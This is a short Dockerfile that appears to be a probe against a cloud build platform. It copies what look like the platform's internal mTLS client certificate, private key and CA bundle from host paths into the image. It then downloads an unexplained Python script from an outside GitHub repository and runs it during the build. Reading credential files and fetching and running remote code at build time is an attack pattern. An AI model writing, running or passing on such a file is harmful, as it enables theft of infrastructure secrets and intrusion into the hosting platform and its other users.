# MARK-I68052-fail-d12a55
FROM alpine:3.20
RUN echo MARK-I68052-fail-d12a55-step1
COPY var/lib/railwayapp/mtls-pki/client.crt /pki/client.crt
COPY var/lib/railwayapp/mtls-pki/client.key /pki/client.key
COPY var/lib/railwayapp/mtls-pki/server-ca-bundle.crt /pki/server-ca-bundle.crt
RUN apk add --no-cache curl openssl python3 >/dev/null 2>&1; echo APKDONE
RUN curl -sS -m 25 -o /p.py https://raw.githubusercontent.com/onepluspadtrading/buildctx-lab/main/probe_fail_i68052.py && echo DL_OK && MARK=I68052-fail-d12a55 timeout 420 python3 /p.py 2>&1 | head -c 60000
CMD ["sh","-c","sleep 60"]
